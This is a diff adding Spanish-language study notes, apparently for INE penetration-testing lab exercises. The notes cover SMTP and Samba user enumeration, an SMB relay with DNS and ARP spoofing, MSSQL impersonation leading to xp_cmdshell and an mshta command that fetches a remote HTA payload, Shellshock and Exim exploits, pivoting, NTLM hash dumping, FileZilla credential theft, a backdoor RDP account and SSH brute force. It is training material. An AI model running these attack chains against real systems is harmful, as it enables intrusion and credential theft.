@@ -2190,30 +2190,610 @@ type FLAG1.txt
 ### ~ Linux Enumeration
 
 ```bash
+nmap demo.ine.local demo2.ine.local demo3.ine.local demo4.ine.local
+# escaneo inicial contra los 4 targets, para ver qué servicios corre cada uno
 
+# === Target 1 (demo.ine.local) - SMTP, puerto 25 ===
+
+nmap -sV -p 25 demo.ine.local
+# identifica el servicio y versión -> Postfix smtpd
+
+nmap --script smtp-commands -p 25 demo.ine.local
+# lista los métodos/comandos SMTP habilitados en el server
+# nos interesan 2 en particular:
+# VRFY = valida si un usuario existe en el sistema
+# ETRN = revela la dirección real de entrega de alias/mailing lists
+
+# 3 formas de enumerar usuarios válidos vía SMTP (VRFY):
+
+# 1) Metasploit
+msfconsole -q
+search smtp_enum
+use auxiliary/scanner/smtp/smtp_enum
+show options
+set RHOSTS demo.ine.local
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+exploit
+# resultado: 7 usuarios válidos (administrator, anon, auditor, demo, diag, rooty, sysadmin)
+
+# 2) smtp-user-enum.pl (script Perl standalone)
+smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/common_users.txt -t demo.ine.local
+# -M VRFY = método de verificación | -U = wordlist de usuarios | -t = target
+# mismo resultado: 7 usuarios
+
+# 3) Script NSE de Nmap
+nmap --script smtp-enum-users -p 25 demo.ine.local
+# solo devuelve 3 usuarios (administrator, sysadmin, root)
+# -> porque usa su propia wordlist interna, distinta a la de MSF:
+# /usr/share/nmap/nselib/data/usernames.lst
+
+# === Target 2 (demo2.ine.local) - Samba, puertos 445/139 ===
+
+nmap -sV -p 445,139 demo2.ine.local
+# identifica versión -> Samba smbd 3.X - 4.X
+
+enum4linux -r demo2.ine.local | grep "Local User"
+# -r = RID Cycling, enumera usuarios locales del host Samba
+# encontramos 6 usuarios (sin contar "nobody")
+
+smbmap -H demo2.ine.local
+# lista shares SMB disponibles y sus permisos
+# encontramos share "public" con permisos READ/WRITE
+
+nmap --script smb-enum-shares -p 445 demo2.ine.local
+# confirma qué shares permiten acceso anónimo/guest
+# "public" es accesible anónimamente con READ/WRITE
+
+smbclient -N \\\\demo2.ine.local\\public -U ""
+# -N = sin password | -U "" = usuario en blanco (conexión anónima)
+ls
+cd secret\
+ls
+get flag
+exit
+cat flag
+# FLAG (Samba): 03ddb97933e716f5057a18632badb3b4
+
+rpcclient -U "" -N demo2.ine.local
+# conexión anónima vía rpcclient, permite gestión/enumeración más profunda:
+# enumdomusers    -> enumera usuarios
+# enumdomgroups   -> enumera grupos del dominio
+# enumdomains     -> info de dominios
+# queryuser <RID> -> info detallada de un usuario puntual
+# (con privilegios suficientes, incluso se pueden crear/borrar usuarios)
+
+# === Target 3 (demo3.ine.local) - Finger, puerto 79 ===
+
+finger root@demo3.ine.local
+# consulta directa de info del usuario root (built-in en todo Linux)
+
+msfconsole -q
+search finger_users
+use auxiliary/scanner/finger/finger_users
+show options
+set RHOSTS demo3.ine.local
+exploit
+# enumera usuarios válidos del sistema vía protocolo finger (TCP/79)
+
+# Script standalone (finger-user-enum.pl) como alternativa a Metasploit:
+cd /Desktop/tools
+mkdir finger-user-enum
+cd finger-user-enum
+chmod +x finger-user-enum.pl
+/root/Desktop/tools/finger-user-enum/finger-user-enum.pl -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t demo3.ine.local
+# -U = wordlist de usuarios a probar | -t = target
+# encuentra usuarios + 3 flags escondidas en las cuentas: gopher, diag, webmaster
+
+finger gopher@demo3.ine.local
+finger diag@demo3.ine.local
+finger webmaster@demo3.ine.local
+# FLAG1: 098F6BCD4621D373CADE4E832627B4F6
+# FLAG2: F765F7A0A169F4F6654EE72A84A9EB
+# FLAG3: C4CA4238A0B923820DCC509A6F75849B
+
+# El comando finger también expone data personal jugosa por usuario:
+finger admin@demo3.ine.local   # teléfono de oficina
+finger tom@demo3.ine.local     # a qué usuario se reenvía su email
+finger tim@demo3.ine.local     # detalles de proyecto + fecha/hora de login
+finger jim@demo3.ine.local     # si tiene PGP key
+finger jil@demo3.ine.local     # su "plan" (plan file)
+
+# === Target 4 (demo4.ine.local) - FTP, puerto 21 ===
+
+nmap -sV -p 21 demo4.ine.local
+# identifica versión -> ProFTPD 1.3.3c
+
+nmap --script vuln -p 21 demo4.ine.local
+# NSE category "vuln" -> corre todos los scripts de detección de vulnerabilidades
+# detecta que ProFTPD 1.3.3c tiene un backdoor conocido
+# y confirma explotabilidad porque el script logra ejecutar "id" en el target
+
+# Puntos clave para el examen
+# SMTP VRFY = enumera usuarios válidos; distintas wordlists dan distintos resultados
+#             (MSF wordlist != Nmap NSE wordlist)
+# enum4linux -r = RID Cycling para sacar usuarios locales de un host Samba
+# smbmap = rápido para ver shares + permisos (READ/WRITE) de un vistazo
+# rpcclient -U "" -N = sesión anónima con funciones de gestión de dominio Samba
+# finger (TCP/79) = protocolo viejo pero MUY informativo (teléfono, proyecto, PGP,
+#                    último login) si está mal configurado
+# nmap --script vuln = forma rápida de chequear si un servicio tiene CVEs conocidos
+#                       (ej: ProFTPD 1.3.3c backdoor)
 ```
 
 ### ~ Windows Exploitation
 
+#### SMB Relay Attack
 
+```bash
+msfconsole
+use exploit/windows/smb/smb_relay
+set SRVHOST 172.16.5.101
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 172.16.5.101
+set SMBHOST 172.16.5.10
+exploit
+# SRVHOST = IP donde el módulo levanta el server SMB falso (nuestra máquina)
+# SMBHOST = target real al que se van a REENVIAR las credenciales capturadas
+# LHOST   = IP para la conexión reversa del meterpreter
+# el exploit queda escuchando conexiones SMB entrantes para capturar hashes
+
+echo "172.16.5.101 *.sportsfoo.com" > dns
+# creamos un archivo de DNS falso: TODOS los subdominios de sportsfoo.com
+# van a resolver hacia nuestra IP atacante (wildcard *.sportsfoo.com)
+
+dnsspoof -i eth1 -f dns
+# -i = interfaz de red | -f = archivo con las entradas DNS falsas
+# empieza a envenenar las respuestas DNS que pasen por esta interfaz
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+# habilita IP forwarding en el atacante
+# necesario para actuar de "man in the middle" sin cortar la conexión de la víctima
+
+# ARP Spoofing (2 terminales separadas) para interceptar el tráfico entre:
+# víctima (Windows 7, 172.16.5.5)  <-->  gateway (172.16.5.1)
+arpspoof -i eth1 -t 172.16.5.5 172.16.5.1   # nos hacemos pasar por el gateway ante la víctima
+arpspoof -i eth1 -t 172.16.5.1 172.16.5.5   # nos hacemos pasar por la víctima ante el gateway
+# (ARP poisoning detallado en el capítulo de Poisoning & Sniffing - Lab10)
+
+# Flujo del ataque:
+# 1. Windows 7 intenta conectarse a \\fileserver.sportsfoo.com\AnyShare
+# 2. dnsspoof responde con la IP del atacante (172.16.5.101) en vez de la real
+# 3. la víctima termina conectándose a \\172.16.5.101\AnyShare sin saberlo
+# 4. el exploit smb_relay captura las credenciales/hash SMB de esa conexión
+# 5. usa esas credenciales automáticamente contra el SMBHOST real (172.16.5.10)
+#    -> obtenemos meterpreter en el target real
+# (funciona porque la víctima usa las MISMAS credenciales en fileserver y target)
+
+sessions
+sessions -i 1
+getuid
+# listamos sesiones activas, interactuamos con la primera, y confirmamos
+# con qué usuario quedamos ejecutando en la sesión meterpreter
+
+# Puntos clave para el examen
+# SMB Relay != password cracking: NO rompe el hash, lo REENVÍA (relay) en vivo
+#   a otro host que confía en las mismas credenciales
+# requiere: SMB signing deshabilitado en el target, y credenciales reutilizadas
+#   entre el server que se está suplantando y el SMBHOST real
+# combina 3 técnicas: DNS spoofing + ARP spoofing (MITM) + SMB relay (MSF)
+# ip_forward=1 es indispensable para no cortar la conexión de la víctima al hacer MITM
+```
+
+#### MSSQL DB User Impersonation to RCE
+
+```bash
+nmap demo.ine.local
+# scan inicial, puerto 1433 (MSSQL default) aparece abierto
+
+nmap --script ms-sql-info -p 1433 demo.ine.local
+# identifica versión del servidor -> Microsoft SQL Server 2019
+
+python3 mssqlclient.py bob:KhyUuxwp7Mcxo7@demo.ine.local
+# mssqlclient.py (impacket) para conectarse al MSSQL con credenciales de un
+# usuario de bajo privilegio (bob)
+
+select @@version;
+# consulta versión del SQL Server + SO del host
+
+select loginname from syslogins where sysadmin = 1;
+# lista qué logins tienen el rol fijo "sysadmin" (control total sobre la instancia)
+# por default, solo "sa" tiene este rol
+
+enable_xp_cmdshell
+# xp_cmdshell = stored procedure que permite ejecutar comandos del SO
+#               directamente desde SQL (levanta una shell de Windows)
+# con el usuario bob -> falla, no tiene privilegios para habilitarlo
+
+SELECT distinct b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+# busca qué usuarios tienen permiso de IMPERSONATE sobre otros logins
+# resultado: sa y dbuser permiten ser impersonados
+
+SELECT SYSTEM_USER
+EXECUTE AS LOGIN = 'sa'
+# intento directo de impersonar a "sa" desde bob -> ERROR (sin permiso directo)
+
+SELECT SYSTEM_USER
+EXECUTE AS LOGIN = 'dbuser'
+SELECT SYSTEM_USER
+# impersonamos a dbuser -> funciona, ahora la sesión corre como dbuser
+
+SELECT SYSTEM_USER
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+# desde dbuser, impersonamos a sa -> funciona
+# cadena de escalación: bob -> dbuser -> sa
+# (mala configuración: permisos de IMPERSONATE encadenados entre usuarios)
+
+enable_xp_cmdshell
+# ahora sí funciona, porque la sesión corre efectivamente como "sa" (sysadmin)
+
+EXEC xp_cmdshell "whoami"
+# RCE confirmado -> corre como NT Service\MSSQL$SQLEXPRESS
+
+# --- Obtener meterpreter vía HTA Server ---
+
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+# hta_server = hostea un archivo .hta malicioso
+# al abrirse, ejecuta un payload vía PowerShell (con prompts de IE de por medio)
+
+EXEC xp_cmdshell "mshta.exe http://10.10.15.2:8080/Ju9EybU.hta"
+# desde la sesión MSSQL (ya con sysadmin/xp_cmdshell), forzamos al target a
+# ejecutar mshta.exe apuntando al HTA server -> dispara el payload
+
+# (si no llega la sesión a la primera, repetir el comando)
+
+sessions
+sessions -i 1
+sysinfo
+getuid
+# confirmamos la sesión meterpreter obtenida
+
+cat C:\\flag.txt
+# Flag: c5b7da8ca7d051749cd5d3e1e741ef91
+
+# Puntos clave para el examen
+# ms-sql-info (NSE) = identifica versión de MSSQL rápido sin necesidad de conectar
+# sysadmin role = control total; por default solo lo tiene "sa"
+# IMPERSONATE mal configurado = permite escalar de user en user hasta sysadmin
+#   (cadena de impersonación: siempre revisar sys.server_permissions)
+# xp_cmdshell = la vía clásica de RCE una vez con privilegios sysadmin en MSSQL
+# hta_server (MSF) = técnica alternativa para obtener shell/meterpreter una vez
+#   que ya tenés RCE vía xp_cmdshell (ejecuta mshta.exe contra el payload)
+```
 
 ### ~ Linux Exploitation
 
+```bash
+nmap demo.ine.local
+# scan inicial: puertos 80 (http) y 25 (smtp) abiertos
 
+nmap -sV -p 80,25 demo.ine.local
+# identifica versiones: Apache httpd 2.4.7 y Exim smtpd 4.89
+
+# Firefox -> demo.ine.local
+# la web corre la aplicación "EGallery" (versión desconocida)
+
+searchsploit EGallery
+# searchsploit = busca exploits públicos por nombre de servicio/app
+# encuentra un módulo de Metasploit para EGallery
+
+msfconsole -q
+search egallery
+use exploit/unix/webapp/egallery_upload_exec
+show options
+# módulo: EGallery Arbitrary '.PHP' File Upload
+# por default trae TARGETURI=/sample, pero la app corre en la raíz -> hay que cambiarlo
+
+ip addr
+# chequeamos nuestra IP de atacante para setear LHOST correctamente
+
+set RHOSTS demo.ine.local
+set LHOST 192.72.201.2
+set TARGETURI /
+exploit
+# explota el upload arbitrario de PHP -> RCE -> meterpreter
+
+sysinfo
+getuid
+# confirmamos: Ubuntu server, sesión corriendo como www-data (usuario típico
+# de los procesos de Apache, privilegios bajos)
+
+ls
+cat THIS_IS_FLAG5234234324/FLAG1
+# FLAG1: e56938b6e91af44bc116b494384b579e
+
+# --- Escalación de privilegios vía Exim smtpd ---
+
+searchsploit exim 4.89
+# Exim 4.89 es vulnerable a un exploit local de privilege escalation
+
+background
+search exim4
+use exploit/linux/local/exim4_deliver_message_priv_esc
+show options
+# módulo válido para Exim 4.87 - 4.91
+# requiere SESSION = id de la sesión meterpreter ya obtenida (para pivotear desde ahí)
+
+set SESSION 1
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+# se cambia el payload default (x64) a x86 según arquitectura del target
+set LHOST 192.72.201.2
+exploit
+getuid
+# éxito -> nueva sesión meterpreter con privilegios root
+
+ls /root
+cat /root/FLAG2
+# FLAG2: 79ff114680e11e44a71d773068485a9e
+
+# --- Pivoting hacia segunda subnet ---
+
+ipconfig
+# el host demo.ine.local tiene 2 interfaces -> hay otra subnet accesible
+# (192.161.244.0/24)
+
+run autoroute -s 192.161.244.0/24
+# agrega ruta hacia la nueva subnet a través de la sesión meterpreter actual
+
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.161.244.3-5
+run
+# port scan interno (a través del pivot) -> puerto 80 abierto en 192.161.244.3
+
+sessions -i 2
+portfwd add -l 1234 -p 80 -r 192.161.244.3
+portfwd list
+# port forward: puerto remoto 80 -> puerto local 1234
+# así podemos acceder al servicio interno desde nuestra propia máquina
+
+background
+nmap -sV -p 1234 localhost
+# escaneamos localhost:1234 (que en realidad apunta al target interno)
+# resultado: Apache httpd 2.2.22
+
+# Firefox -> http://localhost:1234
+# nada relevante a simple vista -> Ver código fuente de la página (View Page Source)
+# se encuentra un <iframe> apuntando a /cgi-bin/stats -> posible vector CGI
+
+use auxiliary/scanner/http/apache_mod_cgi_bash_env
+show options
+set RHOSTS 192.161.244.3
+set TARGETURI /cgi-bin/stats
+exploit
+# auxiliary scanner para detectar Shellshock (CVE-2014-6271)
+# vulnerabilidad en bash: si se le pasa una variable de entorno con cierto patrón,
+# bash ejecuta comandos arbitrarios embebidos en ella
+# resultado: target vulnerable a Shellshock
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+show options
+# el payload default (linux/x86/meterpreter/reverse_tcp) NO sirve acá:
+# 192.161.244.3 no es accesible directo desde Kali (está detrás del pivot)
+# reverse_tcp "funcionaría" pero nunca llegaría la conexión de vuelta
+
+set PAYLOAD linux/x86/meterpreter/bind_tcp
+# bind_tcp = el target abre el puerto y escucha, nosotros nos conectamos a él
+# (en vez de que el target intente conectarse de vuelta a nosotros)
+set RHOSTS 192.161.244.3
+set TARGETURI /cgi-bin/stats
+exploit
+getuid
+# éxito -> meterpreter en el segundo target, vía Shellshock + pivoting
+
+# Puntos clave para el examen
+# searchsploit = primer paso para buscar exploits públicos de apps/versiones conocidas
+# www-data = usuario low-priv típico de procesos Apache en Ubuntu -> requiere priv esc
+# elegir bien la arquitectura del payload (x86 vs x64) según el target
+# autoroute + portfwd = técnica de pivoting para alcanzar y exponer servicios
+#   de una subnet interna no accesible directamente
+# reverse_tcp vs bind_tcp:
+#   reverse_tcp = target se conecta a nosotros (falla si no hay ruta directa)
+#   bind_tcp = nosotros nos conectamos al target (mejor detrás de un pivot)
+# Shellshock (CVE-2014-6271) = inyección de comandos vía variables de entorno mal
+#   parseadas por bash, típico en scripts CGI antiguos
+```
 
 ### ~ Windows Post-Exploitation
 
+#### Dumping & Cracking NTLM Hashes
 
-## 05 - System Security & x86 Assembly Fundamentals
+```bash
+nmap demo.ine.local
+# scan inicial, múltiples puertos abiertos
 
-### ~ Architecture Fundamentals
-### ~ x86 Assembly Fundamentals
+nmap -sV -p 80 demo.ine.local
+# identifica versión del servicio web -> BadBlue 2.7
 
-## 06 - Exploit Development: Buffer Overflows
+searchsploit badblue 2.7
+# busca exploits públicos para BadBlue 2.7 -> hay módulo de Metasploit disponible
 
-### ~ Buffer Overflow Fundamentals
-### ~ Stack-Based Overflow
-### ~ SEH Overflow
+/etc/init.d/postgresql start
+# levanta PostgreSQL, necesario para que Metasploit guarde resultados en su DB
+# (hashes, credenciales, hosts, etc.)
+
+msfconsole -q
+use exploit/windows/http/badblue_passthru
+set RHOSTS demo.ine.local
+exploit
+# explota BadBlue Passthru -> obtenemos sesión meterpreter
+
+migrate -N lsass.exe
+# lsass.exe = proceso de Windows que maneja autenticación y guarda credenciales
+#             en memoria (hashes NTLM, tickets, etc.)
+# migramos ahí para poder volcar los hashes con privilegios necesarios
+
+hashdump
+# vuelca los hashes NTLM de todos los usuarios del sistema (SAM database)
+
+background
+creds
+# background = manda la sesión meterpreter a segundo plano
+# creds = muestra todas las credenciales/hashes guardados en la base de datos de MSF
+#         (confirma que hashdump los guardó correctamente)
+
+use auxiliary/analyze/crack_windows
+set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+exploit
+# módulo auxiliar que toma los hashes NTLM guardados en la DB de MSF
+# e intenta crackearlos offline contra una wordlist personalizada
+
+# Resultado del cracking:
+# Administrator: password
+# bob: password1
+
+# Puntos clave para el examen
+# lsass.exe = proceso clave donde Windows guarda credenciales en memoria
+#             -> migrar ahí antes de hacer hashdump
+# hashdump = extrae los hashes NTLM de la SAM database local
+# los hashes NTLM no se "descifran", se CRACKEAN (fuerza bruta/wordlist) porque
+#   NTLM no es un algoritmo reversible
+# creds = útil para ver de un vistazo todo lo que MSF ya capturó/guardó en su DB
+# postgresql debe estar corriendo para que MSF pueda usar su base de datos
+#   (hashdump, creds, workspaces, etc. dependen de esto)
+```
+
+#### Windows Post-Exploitation Lab
+
+```bash
+nmap demo.ine.local
+# scan inicial, múltiples puertos abiertos
+
+nmap -sV -p 80 demo.ine.local
+# identifica servicio -> HFS 2.3 (HTTP File Server, servidor de archivos)
+
+searchsploit hfs 2.3
+# HFS 2.3 es vulnerable a RCE (Remote Command Execution)
+
+msfconsole -q
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec
+show options
+set RHOSTS demo.ine.local
+exploit
+# explota Rejetto HttpFileServer 2.3 -> obtenemos meterpreter
+
+sysinfo
+getuid
+# target Windows, sesión con privilegios de administrator
+
+getsystem
+getuid
+# getsystem = intenta escalar a privilegios SYSTEM (NT Authority) usando
+# técnicas predefinidas:
+# 0 = todas las técnicas disponibles
+# 1 = Named Pipe Impersonation (In Memory/Admin)
+# 2 = Named Pipe Impersonation (Dropper/Admin)
+# 3 = Token Duplication (In Memory/Admin)
+# 4 = Named Pipe Impersonation (RPCSS variant)
+# en este caso funciona con Named Pipe Impersonation -> ahora somos SYSTEM
+
+# --- Pivoting hacia demo1.ine.local (10.0.29.240) ---
+
+shell
+ping 10.0.29.240
+# confirmamos que el segundo target es alcanzable DESDE el host comprometido
+# (aunque no lo es directamente desde nuestra Kali)
+
+# CTRL+C, y (para salir de la shell y volver a meterpreter)
+run autoroute -s 10.0.29.240/20
+# agrega ruta hacia esa subnet a través de la sesión meterpreter actual
+
+run post/windows/gather/enum_applications
+# enumera todas las aplicaciones instaladas en el host comprometido
+# encontramos FileZilla Client 3.57.0 -> posible fuente de credenciales FTP guardadas
+
+run post/multi/gather/filezilla_client_cred
+# post module que extrae credenciales guardadas del cliente FileZilla
+# (nota: a veces el output viene en formato no legible)
+
+# Alternativa manual si el módulo falla: leer el XML de configuración directo
+cat C:\\Users\\Administrator\\AppData\\Roaming\\FileZilla\\sitemanager.xml
+# credenciales encontradas:
+# Server: 10.0.29.240 | User: admin | Pass: FTPStrongPwd
+
+cat /etc/proxychains4.conf
+# verificamos configuración de proxychains -> socks4 en puerto 9050
+
+background
+use auxiliary/server/socks_proxy
+show options
+set SRVPORT 9050
+set VERSION 4a
+exploit
+jobs
+# levanta un proxy SOCKS4a sobre la sesión meterpreter, en el puerto que
+# proxychains espera (9050), para poder rutear herramientas externas al pivot
+
+proxychains nmap demo1.ine.local -sT -Pn -p 1-50
+# -sT = connect scan (obligatorio con proxychains, -sS no sirve)
+# -Pn = salta host discovery
+# scan "seguro" vía proxy (los auxiliary scanners de MSF son más agresivos
+# y pueden tirar la sesión)
+# resultado: puertos 21 (FTP) y 22 (SSH) abiertos en el pivot
+
+sessions -i 1
+shell
+net user guest_1 guestpwd /add
+net localgroup "Remote Desktop Users" guest_1 /add
+net user
+# creamos un usuario nuevo y lo agregamos al grupo RDP
+# (para tener acceso gráfico vía escritorio remoto sobre demo.ine.local, que
+# ya sabíamos tenía el puerto 3389 expuesto)
+
+xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local
+# nos conectamos por RDP con el usuario recién creado
+
+# Desde la sesión RDP: abrimos FileZilla Client y nos conectamos a
+# 10.0.29.240 con user: admin / pass: FTPStrongPwd
+# encontramos un archivo usernames.txt -> lo descargamos y revisamos
+# usuarios encontrados: administrator, sysadmin, student
+# -> objetivo: la cuenta administrator
+
+# CTRL+C, y (volver a meterpreter)
+portfwd add -l 1234 -p 22 -r 10.0.29.240
+portfwd list
+# forward del puerto 22 (SSH) del pivot hacia nuestro puerto local 1234
+
+nmap -sV -p 1234 localhost
+# confirma OpenSSH corriendo (aunque el target es Windows -> raro pero posible)
+
+proxychains hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo1.ine.local ssh
+# fuerza bruta SSH vía proxychains contra el usuario administrator
+# password encontrada: password1
+
+background
+use auxiliary/scanner/ssh/ssh_login
+show options
+set RHOSTS demo1.ine.local
+set USERNAME administrator
+set PASSWORD password1
+set gatherproof false
+exploit
+sessions
+# login SSH exitoso con las credenciales encontradas -> nueva sesión
+
+sessions -i 2
+dir C:\
+type C:\FLAG1.txt
+# Flag: a3dcb4d229de6fde0db5686dee47145d
+
+# Puntos clave para el examen
+# getsystem = escalación rápida a SYSTEM en Windows (named pipe / token duplication)
+# enum_applications + filezilla_client_cred = buscar credenciales guardadas por
+#   clientes FTP/apps instaladas es un vector post-exploit MUY común
+# socks_proxy + proxychains = permite usar herramientas externas (nmap, hydra)
+#   a través de una sesión meterpreter como pivot
+# -sT obligatorio con proxychains (no soporta -sS/half-open)
+# crear un usuario RDP nuevo = técnica típica para tener acceso GUI persistente
+#   sin depender solo de la shell de meterpreter
+# portfwd = expone un puerto remoto (dentro del pivot) como si fuera local,
+#   para poder escanearlo/conectarte directo con herramientas normales
+```
 
 ## 07 - Privilege Escalation
 
